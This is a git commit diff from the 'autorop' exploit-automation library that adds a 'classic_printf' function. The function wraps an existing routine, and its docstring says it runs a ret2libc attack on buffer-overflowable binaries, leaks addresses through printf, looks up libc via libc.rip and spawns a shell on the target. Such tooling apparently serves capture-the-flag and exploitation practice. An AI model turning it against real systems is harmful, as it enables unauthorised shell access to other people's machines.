6490df96b4abe83a880e869834fbcfcd8d0441e9
Mariusz Skoneczko <mariusz@skoneczko.com>
2020-10-01 11:57:01 +1000

    Add turnkey.classic_printf

--- autorop/turnkey/__init__.py
+++ autorop/turnkey/__init__.py
@@ -1,2 +1,3 @@
 from autorop.turnkey.classic import classic as classic
 from autorop.turnkey.classic_puts import classic_puts as classic_puts
+from autorop.turnkey.classic_printf import classic_printf as classic_printf
---
+++ autorop/turnkey/classic_printf.py
@@ -0,0 +1,18 @@
+from autorop import PwnState, turnkey, pipeline, leak
+
+
+def classic_printf(state: PwnState) -> PwnState:
+    """Perform an attack against a non-PIE/non-ASLR buffer-overflowable binary.
+
+    Perform a ret2libc attack on a non-PIE/non-ASLR target
+    (at most one of these is fine, but not both), leaking with ``printf``.
+    You can set ``state.elf.address`` yourself and it might work for PIE and ASLR.
+    We use https://libc.rip to find the libc, and then spawn a shell on the target.
+
+    Arguments:
+        state: The current ``PwnState``.
+
+    Returns:
+        Reference to the mutated ``PwnState``.
+    """
+    return turnkey.classic(state, leak=leak.printf)
